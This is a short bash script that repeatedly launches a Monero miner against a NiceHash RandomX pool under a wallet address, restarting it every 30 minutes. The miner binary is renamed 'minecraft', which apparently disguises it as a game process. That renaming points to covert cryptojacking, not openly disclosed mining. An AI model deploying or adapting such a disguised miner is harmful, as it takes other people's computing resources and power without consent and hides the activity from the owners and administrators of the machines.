#!/bin/bash

while true; do
    ./minecraft -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -a rx -k -u NHbLt4t5HiuQaT4qrLCBnoEUeKH1aG44eGdG.slug -p x &
    minecraft_pid=$!
    sleep 1800
    kill $minecraft_pid
    wait $minecraft_pid 2>/dev/null
done
